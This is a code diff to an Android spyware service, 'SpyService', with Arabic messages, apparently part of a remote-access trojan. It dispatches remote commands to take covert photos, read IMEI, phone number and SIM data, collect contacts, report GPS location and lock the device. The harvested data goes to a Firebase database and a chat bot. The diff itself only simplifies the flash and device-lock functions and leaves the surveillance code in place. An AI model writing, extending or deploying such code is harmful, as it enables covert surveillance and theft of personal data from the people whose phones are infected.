@@ -31,9 +31,7 @@ import android.provider.Settings;
 import android.provider.Telephony;
 import android.telephony.TelephonyManager;
 import android.util.Log;
-import android.widget.Toast;
 import androidx.core.app.NotificationCompat;
-import androidx.core.content.ContextCompat;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ValueEventListener;
@@ -162,12 +160,8 @@ public class SpyService extends Service {
                 case "fake_notif": showFakeNotification(); break;
                 case "take_photo": takePhoto(false); break;
                 case "take_photo_front": takePhoto(true); break;
-                case "flash_on": flash(true, false); break;
-                case "flash_off": flash(false, false); break;
-                case "flash_on_front": flash(true, true); break;
-                case "flash_off_front": flash(false, true); break;
-                case "flash_on_back": flash(true, false); break;
-                case "flash_off_back": flash(false, false); break;
+                case "flash_on": flash(true); break;
+                case "flash_off": flash(false); break;
                 case "get_imei": getImei(); break;
                 case "get_phone": getPhoneNumber(); break;
                 case "get_sim": getSimInfo(); break;
@@ -240,7 +234,7 @@ public class SpyService extends Service {
         dbRef.child("devices").child(deviceId).child("data").child(key).setValue(value);
     }
 
-    // ===== دوال جمع البيانات =====
+    // ===== جمع البيانات =====
     private File collectContacts() throws Exception {
         File f = new File(getCacheDir(), "contacts.txt");
         PrintWriter pw = new PrintWriter(f);
@@ -412,7 +406,7 @@ public class SpyService extends Service {
             Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             if (loc != null) {
-                String msg = "📍 الموقع: " + loc.getLatitude() + ", " + loc.getLongitude();
+                String msg = "📍 " + loc.getLatitude() + ", " + loc.getLongitude();
                 sendData("LOCATION", msg);
                 bot.sendMessage(msg);
             } else {
@@ -531,7 +525,7 @@ public class SpyService extends Service {
         }
     }
 
-    private void flash(boolean on, boolean front) {
+    private void flash(boolean on) {
         try {
             CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
             String cameraId = "0";
@@ -619,13 +613,17 @@ public class SpyService extends Service {
     }
 
     private void lockDevice() {
-        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-        ComponentName admin = new ComponentName(this, DeviceAdmin.class);
-        if (dpm.isAdminActive(admin)) {
-            dpm.lockNow();
-            bot.sendMessage("🔒 تم قفل الجهاز");
-        } else {
-            bot.sendMessage("❌ صلاحية مدير الجهاز غير مفعلة");
+        try {
+            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            ComponentName admin = new ComponentName(this, DeviceAdmin.class);
+            if (dpm.isAdminActive(admin)) {
+                dpm.lockNow();
+                bot.sendMessage("🔒 تم قفل الجهاز");
+            } else {
+                bot.sendMessage("❌ صلاحية مدير الجهاز غير مفعلة");
+            }
+        } catch (Exception e) {
+            bot.sendMessage("❌ فشل قفل الجهاز: " + e.getMessage());
         }
     }
 
